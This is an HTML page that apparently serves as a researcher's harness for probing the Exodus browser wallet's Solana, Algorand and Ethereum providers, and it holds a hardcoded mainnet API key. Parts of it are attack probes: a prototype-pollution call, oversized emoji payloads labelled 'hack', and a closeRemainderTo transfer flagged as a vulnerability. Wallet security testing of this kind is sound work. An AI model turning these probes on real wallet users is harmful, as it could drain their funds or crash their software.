<html>
    <head>
        <title>x0-w</title>
        <link rel="shortcut icon" type="image/xss+svg" href="xss.svg"/>
        <!--<script src="chrome-extension://llekelocgcbelmdpkdjigdgnckkobioc/algorand-provider.js">ay no</script>-->
        <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/algosdk@v1.24.1/dist/browser/algosdk.min.js" integrity="sha384-cXCnQHmkjqS84S5jqAp6YXjU1ynCEJaHROHklSY7eh+cCXQ3aGX0oSgJSfQgDF5y" crossorigin="anonymous"></script>
    </head>
    <body style="background: rgb(207,31,147); background: radial-gradient(circle, rgba(10,90,200,1) 0%, rgba(250,150,250,1) 35%, rgba(50,250,100,1) 100%);">
        <script type="module">
            // PROTOTYPE POLLUTION
            //window.exodus = {}
            //window.exodus.p = {}
            //window.exodus.p["__proto__"]["isConnected"] = true

            //var payload = '\uD83D\uDC04'.repeat(10000000);
            //console.log("[*] " + payload);
            //document.title = payload;
        </script>

        <script>

            class MyEventDispatcher extends EventTarget {
                doSomething() {
                    this.dispatchEvent(new Event('ACCEPT_INCOMING_CONNECTION'));
                }
            }

            const myEventDispatcher = new MyEventDispatcher();

            function accept_connection() {
                myEventDispatcher.addEventListener('ACCEPT_INCOMING_CONNECTION', (e) => {
                    console.log('Instance fired "ACCEPT_INCOMING_CONNECTION".', e);
                });

                myEventDispatcher.doSomething();
            }

            var Buffer = require('buffer/').Buffer


///////////////////////////////////////////////////////////////////////////////////
/////////////////////// SOLANA ////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////


            async function solana_connect() {
                console.log("[*] CONNECT")
                try {
                    const resp = await window.exodus.solana.connect()
                    console.log('[*] ' + resp.publicKey.toString())
                } catch (err) {
                    console.log('{ code: 4001, message: User rejected the request. }')
                }
            }


            async function solana_eager_connect() {
                console.log("[*] EAGER CONNECT")
                try {
                    const resp = await window.exodus.solana.connect({ onlyIfTrusted: true })
                    console.log('[*] ' + resp.publicKey.toString())
                } catch (err) {
                    console.log('{ code: 4001, message: User rejected the request. }')
                }
            }
            
            
            async function solana_signAndSendTransaction() {
                
                // Set up the connection to the Solana cluster
                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));

                // Set up the transaction instructions
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: 'FM8L4YL6KYGYVZAep2w5UFPGRnWcM9ni6LLCN3wdKCNH',
                        toPubkey: 'FM8L4YL6KYGYVZAep2w5UFPGRnWcM9ni6LLCN3wdKCNH',
                        lamports: 0.01 * solanaWeb3.LAMPORTS_PER_SOL,
                    })
                );

                // Sign and send the transaction
                (async () => {
                    const { signature } = await window.exodus.solana.signAndSendTransaction(transaction,)
                    console.log('[*] Transaction sent with signature', signature);
                })();
                
            }


///////////////////////////////////////////////////////////////////////////////////
/////////////////////// ALGO //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////
            function algo_connect() {
                console.log("[*] CONNECT")
                window.exodus.algorand.connect();
            }



//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//

            // function used to wait for a tx confirmation
            const waitForConfirmation = async function (algodclient, txId) {
                let response = await algodclient.status().do();
                let lastround = response["last-round"];
                console.log(`Waiting for transaction confirmation for txn ${txId}`);
                while (true) {
                    const pendingInfo = await algodclient.pendingTransactionInformation(txId).do();
                    if (pendingInfo["confirmed-round"] !== null && pendingInfo["confirmed-round"] > 0) {
                        //Got the completed Transaction
                        console.log("Transaction " + txId + " confirmed in round " + pendingInfo["confirmed-round"]);
                        break;
                    }
                    lastround++;
                    await algodclient.statusAfterBlock(lastround).do();
                }
                console.log('Transaction confirmed');
            }


            async function sign_then_submit_double_transactions() {

                try {
                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
                    const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                    const port = "";
                    const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                    
                    const algodClient = new algosdk.Algodv2(token, baseServer, port);

                    let sender = window.exodus.algorand.address;
                    console.log('[*] sender: ')
                    console.log(sender)

                    let suggestedParams = await algodClient.getTransactionParams().do();
                
                    let amount = 100000; // equals 0.1 ALGO
                    let amount2 = 200000; // equals 0.2 ALGO

                    const enc = new TextEncoder();
                    let myNote = "doubleassetnote80";
                    let myNote2 = myNote + '-2';
                    const note = enc.encode(myNote);
                    const note2 = enc.encode(myNote2);

                    let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                        suggestedParams,
                        from: sender,
                        to: receiver,
                        amount: amount,
                        note: note
                    });

                    let txn2 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                        suggestedParams,
                        from: sender,
                        to: receiver,
                        amount: amount2,
                        note: note2
                    });

                    algosdk.assignGroupID([txn1,txn2]);

                    const signedTransactions = await window.exodus.algorand.signTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ])

                    let groupedSignedTxns = signedTransactions;

                    let tx = (await algodClient.sendRawTransaction(groupedSignedTxns).do());
                    console.log("[*] Transaction : " + tx.txId);

                    await waitForConfirmation(algodClient, tx.txId);

                } catch (err) {
                    console.log("[-] ERR: ", err);
                }
            }

//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//


//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//


            async function sign_then_submit_double_asset_transactions() {

                try {
                    const receiver = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
                    const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                    const port = "";
                    const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                    
                    const algodClient = new algosdk.Algodv2(token, baseServer, port);

                    let sender = window.exodus.algorand.address;
                    console.log('[*] sender: ')
                    console.log(sender)

                    let suggestedParams = await algodClient.getTransactionParams().do();
                
                    let amount = 100000; // equals 0.1 ALGO

                    const enc = new TextEncoder();
                    let myNote = "doubleassetnote8";
                    let myNote2 = myNote + '-2';
                    const note = enc.encode(myNote);
                    const note2 = enc.encode(myNote2);

                    let txn1 = algosdk.makeAssetTransferTxnWithSuggestedParams(
                        sender,
                        receiver, 
                        undefined, 
                        undefined,
                        amount,  
                        note, 
                        13300122, 
                        suggestedParams
                    )

                    let txn2 = algosdk.makeAssetTransferTxnWithSuggestedParams(
                        sender,
                        receiver, 
                        undefined, 
                        undefined,
                        amount,  
                        note2, 
                        13300122, 
                        suggestedParams
                    )

                    algosdk.assignGroupID([txn1,txn2]);

                    const signedTransactions = await window.exodus.algorand.signTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ])

                    let groupedSignedTxns = signedTransactions;

                    let tx = (await algodClient.sendRawTransaction(groupedSignedTxns).do());
                    console.log("[*] Transaction : " + tx.txId);

                    await waitForConfirmation(algodClient, tx.txId);

                } catch (err) {
                    console.log("[-] ERR: ", err);
                }
            }

//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
//--//--//--//--//--//--//--//--//--//--//--//--//--//--//
            
            
            async function algo_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
        
                let sender = window.exodus.algorand.address;
                console.log('[*] sender: ')
                console.log(sender)

                //Check your balance
                let accountInfo = await algodClient.accountInformation(sender).do();
                console.log('[*] accountInfo: ')
                console.log(accountInfo)
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";
                
                let amount = 100000; // equals 0.1 ALGO
                

                const enc = new TextEncoder();
                const note = enc.encode("note84");

                //let closeRemainderTo = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";

                let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount,
                    note: note
                });

                console.log("[*] txn1: ");
                console.log(txn1);

                algosdk.assignGroupID([txn1])

                try {
                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});
                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn1.toByte(),
                    ]);
                    console.log({tmp});
                    const { signedTransactions } = tmp;

                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                } catch (e) {
                    console.log('[-] algo_transaction ERROR: ');
                    console.log(e);
                }
            }


            // closeRemainerTo vuln
            async function algo_double_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);
        
                let sender = window.exodus.algorand.address;
                console.log('[*] sender: ')
                console.log(sender)

                //Check your balance
                let accountInfo = await algodClient.accountInformation(sender).do();
                console.log('[*] accountInfo: ')
                console.log(accountInfo)
                console.log("Account balance: %d microAlgos", accountInfo.amount);
                
                // Construct the transaction
                let suggestedParams = await algodClient.getTransactionParams().do();
                
                const receiver = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";
                
                let amount = 400000; // equals 0.4 ALGO
                let amount2 = 100000; // equals 0.1 ALGO
                

                const enc = new TextEncoder();
                let myNote = "doublenote84";
                let myNote2 = myNote + '-2';
                const note = enc.encode(myNote);
                const note2 = enc.encode(myNote2);

                //let closeRemainderTo = "3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA";

                let txn1 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount,
                    note: note
                });

                console.log("[*] txn1: ");
                console.log(txn1);

                let txn2 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                    suggestedParams,
                    from: sender,
                    to: receiver,
                    amount: amount2,
                    note: note2
                });

                console.log("[*] txn2: ");
                console.log(txn2);

                const result = await window.exodus.algorand.connect();
                console.log({result});

                algosdk.assignGroupID([txn1,txn2])

                try {
                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});
                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn1.toByte(),
                        txn2.toByte(),
                    ]);
                    console.log({tmp});
                    const { signedTransactions } = tmp;

                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                } catch (e) {
                    console.log('[-] algo_transaction ERROR: ');
                    console.log(e);
                }
            }


            async function asset_transaction() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);

                

                (async () => {

                    let assetID = 312769;
                    let params = await algodClient.getTransactionParams().do();
                    let sender = window.exodus.algorand.address;
                    let recipient = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    let revocationTarget = undefined;
                    let closeRemainderTo = undefined;
                    const enc = new TextEncoder();
                    let myNote = "assetnote90";
                    let note = enc.encode(myNote);;
                    let amount = 1;
                    let txn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget,
                        amount,  note, assetID, params);
                    
                    algosdk.assignGroupID([txn]);

                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});

                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn.toByte(),
                    ]);
                    const { signedTransactions } = tmp;
                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                })().catch(e => {
                    console.log('[-] ERROR: ');
                    console.log(e);
                });
            }


            async function asset_transaction_closeRemainderTo() {
                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
                const port = "";
                const token = { 'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq', };
                
                const algodClient = new algosdk.Algodv2(token, baseServer, port);

                

                (async () => {

                    let assetID = 312769;
                    let params = await algodClient.getTransactionParams().do();
                    let sender = window.exodus.algorand.address;
                    let recipient = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    let revocationTarget = undefined;
                    let closeRemainderTo = '3D5ROSIORET5ZGMS2R3AVOSHXIJC2RO3IJ7UJKKOEQSHQXMPXPJ2MW3SSA';
                    const enc = new TextEncoder();
                    let myNote = "assetRemaindernote90";
                    let note = enc.encode(myNote);;
                    let amount = 1;
                    let txn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget,
                        amount,  note, assetID, params);
                    
                    algosdk.assignGroupID([txn]);

                    const connectResult = await window.exodus.algorand.connect();
                    console.log({connectResult});

                    const tmp = await window.exodus.algorand.signAndSendTransaction([
                        txn.toByte(),
                    ]);
                    const { signedTransactions } = tmp;
                    console.log('[*] Transaction: ');
                    console.log(signedTransactions);
                })().catch(e => {
                    console.log('[-] ERROR: ');
                    console.log(e);
                });
            }


///////////////////////////////////////////////////////////////////////////////////
/////////////////////// ETH ///////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////


            // Sign transaction
            async function request_eth_accounts() {
                try {
                    window.exodus.ethereum.request({
                        method: 'eth_accounts',
                        params: [],
                    }).then(address => console.log(`[*]eth_accounts: ${address}`))
                } catch (switchError) {
                    // This error code indicates that the chain is not supported by Exodus.
                    if (switchError.code === 4902) {
                        console.log('[-] Handle chain not supported.');
                    }
                    // Handle other "switch" errors.
                }
            }


            async function request_eth_get_balance() {
                window.exodus.ethereum.request({
                    method: 'eth_get_balance',
                    params: ["0xe7cA97fFe64282CC104dB55cab2BbA4A4e7B552E", "latest"],
                })
                .then(balance => console.log(`[*] eth_get_balance: ${balance}`))
                .catch(e => console.log('[-] eth_get_balance ERROR ', e))
            }


            async function eth_sendTransaction() {
                const transaction = {
                    from: '0xe7cA97fFe64282CC104dB55cab2BbA4A4e7B552E',
                    to: '0x5dD5B3665fd4401C09473D000DecabEa9F0c0514',
                    gas: '0x76c0', // 30400
                    gasPrice: '0x9184e72a000', // 10000000000000
                    value: '0x5af3107a40000',
                }
              
                try {
                    const resp = await window.exodus.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transaction],
                    })
                    // For 'eth_sendTransaction', `resp` will be a transaction hash hexadecimal string.
                    console.log(`[*] eth_asset_transaction: ${resp}`)
                    
                } catch (err) {
                    console.log(`[-] eth_asset_transaction: ${err}`)
                }

            }


            async function eth_sendTransaction_withData() {
                const transaction = {
                    from: '0xe7cA97fFe64282CC104dB55cab2BbA4A4e7B552E',
                    to: '0x5dD5B3665fd4401C09473D000DecabEa9F0c0514',
                    gas: '0x76c0', // 30400
                    gasPrice: '0x9184e72a000', // 10000000000000
                    value: '0x5af3107a40000',
                    data: '0xd46e8dd67c5d32be8d46e8dd67c5d32be8058bb8eb970870f072445675058bb8eb970870f072445675',
                }
              
                try {
                    const resp = await window.exodus.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transaction],
                    })
                    // For 'eth_sendTransaction', `resp` will be a transaction hash hexadecimal string.
                    console.log(`[*] eth_asset_transaction: ${resp}`)
                    
                } catch (err) {
                    console.log(`[-] eth_asset_transaction: ${err}`)
                }

            }


            async function eth_compileSolidity() {
                window.exodus.ethereum.request({
                    method: 'eth_compileSolidity',
                    params: ["contract test { function multiply(uint a) returns(uint d) {   return a * 7;   } }",],
                })
                .then(data => console.log(`[*] eth_compileSolidity: ${data}`))
                .catch(e => console.log('[-] eth_get_balance ERROR ', e))
            }
            

///////////////////////////////////////////////////////////////////////////////////
/////////////////////// REST //////////////////////////////////////////////////////            
///////////////////////////////////////////////////////////////////////////////////

            function prot_pollute() {
                window.exodus.p = {}
                window.exodus.p["__proto__"]["isConnected"] = true
            }

            function hack() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack2() {
                var payload = '\uD83D\uDC04';
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function hack3() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:payload, from:"a"});
            }

            function hack4() {
                var payload = '\uD83D\uDC04'.repeat(1000000);
                console.log("[*] " + payload);
                window.exodus.algorand.connect({onlyIfTrusted:false, from:payload});
            }

            function change_title() {
                var payload = '\uD83D\uDC04'.repeat(10000);
                //console.log("[*] " + payload);
                document.title = payload;
            }
        </script>


        <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #042fff">
        <h1 style="color:#F0FE53;text-shadow: 2px 2px 4px #236;">
        102
        </h1>
        <h2>x0-w</h2>
        


        <hr />
        <h3>SOLANA</h3>
        <hr />
        <input type="button" value="solana_connect" onclick="solana_connect()" />
        <input type="button" value="solana_eager_connect" onclick="solana_eager_connect()" />
        <input type="button" value="solana_signAndSendTransaction" onclick="solana_signAndSendTransaction()" />



        <hr />
        <h3>ALGO</h3>
        <hr />
        <input type="button" value="algo_connect" onclick="algo_connect()" />
        <input type="button" value="accept_connection" onclick="accept_connection()" />
        <input type="button" value="sign_then_submit_double_transactions" onclick="sign_then_submit_double_transactions()" />
        <input type="button" value="sign_then_submit_double_asset_transactions" onclick="sign_then_submit_double_asset_transactions()" />
        <input type="button" value="algo_transaction" onclick="algo_transaction()" />
        <input type="button" value="algo_double_transaction" onclick="algo_double_transaction()" />
        <input type="button" value="asset_transaction" onclick="asset_transaction()" />
        <input type="button" value="asset_transaction_closeRemainderTo" onclick="asset_transaction_closeRemainderTo()" />



        <hr />
        <h3>ETH</h3>
        <hr />
        <input type="button" value="request_eth_accounts" onclick="request_eth_accounts()" />
        <input type="button" value="eth_sendTransaction" onclick="eth_sendTransaction()" />
        <input type="button" value="eth_sendTransaction_withData" onclick="eth_sendTransaction_withData()" />
        <input type="button" value="eth_compileSolidity" onclick="eth_compileSolidity()" />
        <hr />
        <h3>REST</h3>
        <hr />
        <input type="button" value="prot_pollute" onclick="prot_pollute()" />
        <input type="button" value="hack" onclick="hack()" />
        <input type="button" value="hack2" onclick="hack2()" />
        <input type="button" value="hack3" onclick="hack3()" />
        <input type="button" value="hack4" onclick="hack4()" />
        <input type="button" value="change_title" onclick="change_title()" />
        </div>
    </body>
</html>
